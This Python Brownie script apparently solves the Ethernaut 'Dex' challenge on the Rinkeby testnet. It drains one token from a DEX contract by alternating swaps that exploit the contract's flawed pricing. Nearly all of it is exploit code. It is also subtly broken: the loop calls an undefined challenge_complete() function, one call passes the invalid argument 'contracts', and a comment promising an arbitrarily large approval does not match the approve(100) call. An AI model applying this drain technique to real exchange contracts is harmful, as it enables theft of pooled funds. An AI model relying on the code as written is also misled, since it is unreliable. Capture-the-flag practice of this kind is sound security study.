from brownie import accounts, Dex, SwappableToken

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x5F442c0E41222983945264C233eaa49ae5F33a3C"
dex = Dex.at(instance_address)

# ------------------------------------------------------------
# to complete this level we must drain the balance of contract
# for one token
# ------------------------------------------------------------


def level_complete():
    return (
        dex.balanceOf(dex.token1(), instance_address) == 0
        or dex.balanceOf(dex.token2(), instance_address) == 0
    )


def balance(token, address):
    if token == "token1" and address == "me":
        return dex.balanceOf(dex.token1(), account.address)
    elif token == "token2" and address == "me":
        return dex.balanceOf(dex.token2(), account.address)
    elif token == "token1" and address == "contract":
        return dex.balanceOf(dex.token1(), instance_address)
    elif token == "token2" and address == "contract":
        return dex.balanceOf(dex.token2(), instance_address)
    else:
        print("wrong inputs")


def swap_one_for_two(amount):
    tx = dex.swap(dex.token1(), dex.token2(), amount, {"from": account})
    tx.wait(1)
    print(f"We now have a balance of {balance('token1','me')} for token1")
    print(f"We now have a balance of {balance('token2','me')} for token2")
    print(f"The contract has a balance of {balance('token1','contract')} for token1")
    print(f"The contract has a balance of {balance('token2','contract')} for token2")


def swap_two_for_one(amount):
    tx = dex.swap(dex.token2(), dex.token1(), amount, {"from": account})
    tx.wait(1)
    print(f"We now have a balance of {balance('token1','me')} for token1")
    print(f"We now have a balance of {balance('token2','me')} for token2")
    print(f"The contract has a balance of {balance('token1', 'contract')} for token1")
    print(f"The contract has a balance of {balance('token2','contract')} for token2")


def exploit():
    # view our balance for token 1 and 2
    print(f"Token 1: {balance('token1', 'me')}")
    print(f"Token 2: {balance('token2', 'me')}")

    # view the contracts balance for token 1 and 2
    print(f"Token 1 for contract: {balance('token1', 'contract')}")
    print(f"Token 2 for contract: {balance('token2', 'contract')}")

    # approve contract to spend arbitrarily large amount of our tokens
    # so we don't need to keep calling approve before each swap
    tx = dex.approve(instance_address, 100, {"from": account})
    tx.wait(1)

    # perform exploit
    swap1 = 1
    while not (challenge_complete()):
        if swap1:
            if balance("token1", "me") > balance("token1", "contract"):
                swap_one_for_two(balance("token1", "contracts"))
            else:
                swap_one_for_two(balance("token1", "me"))
            swap1 = 0
        else:
            if balance("token2", "me") > balance("token2", "contract"):
                swap_two_for_one(balance("token2", "contract"))
            else:
                swap_two_for_one(balance("token2", "me"))
            swap1 = 1

    # confirm that we have completed the level
    print(f"Level has been completed: {level_complete()}")


def main():
    exploit()
